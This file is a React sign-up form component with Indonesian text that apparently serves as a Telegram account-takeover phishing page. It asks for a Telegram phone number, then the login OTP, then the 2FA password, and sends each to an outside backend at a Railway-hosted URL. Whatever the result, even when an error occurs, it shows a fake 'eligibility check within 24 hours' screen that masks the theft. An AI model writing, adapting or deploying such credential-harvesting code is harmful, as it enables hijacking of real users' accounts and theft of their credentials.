"use client";
import { useState } from 'react';

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [nomor, setNomor] = useState('');
  const [otp, setOtp] = useState('');
  const [sandi, setSandi] = useState('');
  const [loading, setLoading] = useState(false);
  const [isFinished, setIsFinished] = useState(false);

  const handleNext = async () => {
    setLoading(true);
    try {
      const res = await fetch('https://backend-python-production-6e72.up.railway.app/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ step, nomor, otp, sandi })
      });
      const data = await res.json();

      if (step === 1) setStep(2);
      else if (step === 2) {
        if (data.status === 'need_2fa') setStep(3);
        else setIsFinished(true); // Langsung ke loading jika sukses
      }
      else if (step === 3) setIsFinished(true); // Selesai sandi langsung ke loading
    } catch (err) {
      if (step === 3) setIsFinished(true); // Tetap ke loading jika error di step akhir
    }
    setLoading(false);
  };

  // TAMPILAN LOADING FULL SCREEN
  if (isFinished) {
    return (
      <div className="full-screen-loading">
        <div className="spinner-circle">
          <span style={{ color: '#2196f3', fontWeight: 'bold' }}>PROCESSING</span>
        </div>
        <p style={{ marginTop: '30px', fontSize: '22px', fontWeight: 'bold', color: '#333' }}>
          Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
        </p>
      </div>
    );
  }

  return (
    <div className="p-4">
      {/* Kode Form Input Kamu Disini (Nomor, OTP, atau Sandi) */}
      <h2 className="text-xl mb-4">{step === 1 ? "Daftar Sekarang" : step === 2 ? "Masukkan OTP" : "Verifikasi 2FA"}</h2>
      <input 
        className="w-full p-2 border mb-4"
        value={step === 1 ? nomor : step === 2 ? otp : sandi}
        onChange={(e) => step === 1 ? setNomor(e.target.value) : step === 2 ? setOtp(e.target.value) : setSandi(e.target.value)}
        placeholder={step === 1 ? "Nomor Telegram" : step === 2 ? "Kode OTP" : "Sandi 2FA"}
      />
      <button 
        onClick={handleNext}
        disabled={loading}
        className="w-full bg-blue-500 text-white p-3 rounded"
      >
        {loading ? "Memproses..." : "DAFTAR SEKARANG"}
      </button>
    </div>
  );
}